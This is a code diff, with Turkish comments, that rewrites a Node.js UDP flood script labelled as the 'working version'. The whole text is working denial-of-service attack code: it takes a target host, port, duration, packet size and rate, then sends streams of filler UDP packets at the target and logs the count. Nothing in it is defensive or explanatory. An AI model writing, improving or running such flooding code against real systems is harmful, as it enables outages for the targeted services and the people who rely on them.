@@ -1,42 +1,50 @@
-// udp_flood.js - OPTİMİZE
+// udp_flood.js - ÇALIŞAN VERSİYON
 const dgram = require('dgram');
 
-// Socket havuzu (tek socket yeter)
-const client = dgram.createSocket('udp4');
-client.unref(); // Node.js'in kapanmasını engelleme
-
-const message = Buffer.from('X'.repeat(64)); // 64 byte'lık paket
-const end = Date.now() + (params.duration * 1000);
+// Parametreler
 const target = params.target;
 const port = params.port;
-const rate = params.requests || 1000; // saniyelik rate
+const duration = (params.duration || 10) * 1000; // ms
+const packetSize = params.packetSize || 1024; // 1KB
+const rate = params.rate || 100; // saniyede 100 paket
 
-console.log(`[+] UDP Flood: ${target}:${port} - ${params.duration}s`);
+console.log(`[+] UDP Flood: ${target}:${port} - ${duration/1000}s`);
 
-let sent = 0;
-let lastLog = Date.now();
+// Tek bir socket oluştur
+const socket = dgram.createSocket('udp4');
+socket.unref(); // Programın kapanmasını engelleme
 
-function flood() {
-    if (Date.now() >= end) {
-        console.log(`[+] Bitti: ${sent} paket`);
-        client.close();
+// Packet oluştur
+const payload = Buffer.alloc(packetSize, 'X');
+
+let sentCount = 0;
+let startTime = Date.now();
+
+// Her saniye rate kadar paket gönder
+const interval = setInterval(() => {
+    const now = Date.now();
+    
+    // Süre doldu mu?
+    if (now - startTime >= duration) {
+        clearInterval(interval);
+        socket.close();
+        console.log(`[+] UDP Flood bitti: ${sentCount} paket`);
         return;
     }
     
-    // Her loop'ta rate/100 kadar paket gönder (100 loop/saniye)
-    for (let i = 0; i < rate / 100; i++) {
-        client.send(message, port, target, (err) => {
-            if (!err) sent++;
+    // Rate kadar paket gönder
+    for (let i = 0; i < rate; i++) {
+        socket.send(payload, 0, payload.length, port, target, (err) => {
+            if (!err) sentCount++;
         });
     }
     
-    // Log her saniye
-    if (Date.now() - lastLog > 1000) {
-        console.log(`[+] ${sent} paket`);
-        lastLog = Date.now();
-    }
+    // Her saniye log
+    console.log(`[+] ${sentCount} paket gönderildi...`);
     
-    setImmediate(flood);
-}
+}, 1000); // Her saniye
 
-flood();
+// Hata yönetimi
+socket.on('error', (err) => {
+    console.log(`[!] Socket hatası: ${err.message}`);
+});
